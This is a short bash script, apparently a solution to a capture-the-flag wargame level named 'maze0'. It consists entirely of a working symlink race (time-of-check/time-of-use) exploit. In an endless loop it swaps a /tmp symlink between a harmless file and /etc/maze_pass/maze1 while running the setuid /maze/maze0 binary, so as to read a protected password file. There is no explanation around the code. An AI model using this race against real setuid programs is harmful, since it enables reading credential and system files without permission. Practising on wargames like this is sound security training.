#!/bin/bash                                    
TARGET="/tmp/128ecf542a35ac5270a87dc740918404" 
MAZEPASS="/etc/maze_pass/maze1"                
while true; do                                 
    rm "$TARGET"                               
    ln -s /tmp/tald0/public $TARGET            
    /maze/maze0 & ln -sf $MAZEPASS $TARGET     
done                                           
